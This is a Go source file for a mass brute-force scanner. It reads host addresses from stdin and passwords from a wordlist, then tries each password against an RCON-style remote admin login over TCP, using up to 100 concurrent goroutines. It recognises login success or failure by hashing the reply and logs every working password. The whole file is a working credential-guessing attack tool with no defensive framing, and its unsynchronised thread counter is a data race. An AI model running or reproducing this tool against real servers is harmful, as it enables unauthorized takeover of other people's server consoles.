package main

import (
	"bufio"
	"flag"
	"log"
	"net"
	"os"
	"time"

	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
)

type MessageType int32

type Message struct {
	Length int32
	ID     int32
	Type   MessageType
	Body   string
}

const (
	MsgResponse MessageType = iota
	headerSize              = 10
)

func encodeMessage(msg Message) ([]byte, error) {
	buf := new(bytes.Buffer)
	for _, v := range []interface{}{
		msg.Length,
		msg.ID,
		msg.Type,
		[]byte(msg.Body),
		[]byte{0, 0},
	} {
		if err := binary.Write(buf, binary.LittleEndian, v); err != nil {
			return nil, err
		}
	}
	return buf.Bytes(), nil
}

func sendMessage(conn net.Conn, msgType MessageType, msg string) (string, error) {
	request := Message{
		Length: int32(len(msg) + headerSize),
		ID:     0,
		Type:   msgType,
		Body:   msg,
	}

	encoded, err := encodeMessage(request)

	if err != nil {
		return "", err
	}

	if _, err := conn.Write(encoded); err != nil {
		return "", err
	}

	respBytes := make([]byte, 16)
	data, err := conn.Read(respBytes)

	if err != nil {
		return "", err
	}

	hasher := sha256.New()
	hasher.Write(respBytes[:data])

	return hex.EncodeToString(hasher.Sum(nil)), nil
}

type Scanner struct {
	passwords []string
	timeout   time.Duration
	threads   int
}

const (
	LOGIN_SUCCESS = "e47032698e86b291bed27d4001f8d9d90664a40f771d1205127d7c7c46360e05"
	LOGIN_ERROR   = "e883145b98f8f15164ea30b08d1f71729285686375479480a341fdfcc5364d85"
)

func (s *Scanner) scanHost(target string, passwords []string) {
	conn, err := net.DialTimeout("tcp", target, s.timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	sum, err := sendMessage(conn, 3, "Zi4kHuhu1")

	if err != nil || (sum != LOGIN_SUCCESS && sum != LOGIN_ERROR) {
		return
	}

	for _, password := range passwords {

		sum, _ := sendMessage(conn, 3, password)

		if sum == LOGIN_ERROR {
			continue
		} else if sum == LOGIN_SUCCESS {
			log.Printf("%s => %s\n", target, password)
			return
		}
	}

}

func (s *Scanner) Scan() {
	running := 0
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		for {

			if running <= s.threads {
				break
			}

			time.Sleep(time.Millisecond * 500)
		}

		running++

		go func(target string) {
			defer func() { running-- }()

			s.scanHost(target, s.passwords)

		}(scanner.Text())

	}
}

func main() {
	wordlist := flag.String("wordlist", "", "Wordlist file")
	threads := flag.Int("threads", 100, "Number of threads")
	timeout := flag.Int("timeout", 5000, "Timeout in milliseconds")

	flag.Parse()

	if *wordlist == "" {
		log.Fatal("Wordlist file is required")
	}

	f, err := os.Open(*wordlist)

	if err != nil {
		log.Fatal(err)
	}

	scanner := bufio.NewScanner(f)

	var passwords []string

	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	(&Scanner{
		passwords: passwords,
		timeout:   time.Duration(*timeout) * time.Millisecond,
		threads:   *threads,
	}).Scan()
}
